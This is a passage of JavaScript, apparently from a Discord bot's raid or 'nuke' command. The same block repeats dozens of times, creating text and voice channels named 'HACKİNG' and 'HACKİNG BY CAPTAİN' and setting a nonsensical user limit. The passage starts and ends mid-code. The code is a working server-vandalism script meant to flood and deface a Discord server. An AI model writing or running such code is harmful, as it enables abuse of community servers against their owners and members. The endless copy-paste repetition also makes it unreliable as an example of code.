    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("112351474621672476124167212127312416276127456212");
      });
    await msg.guild.createChannel("HACKİNG", {
      type: "text"
    });
    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
      type: "text"
    });
      await msg.guild
      .createChannel("HACKİNG BY CAPTAİN", {
        type: "voice"
      })
      .then(chan => {
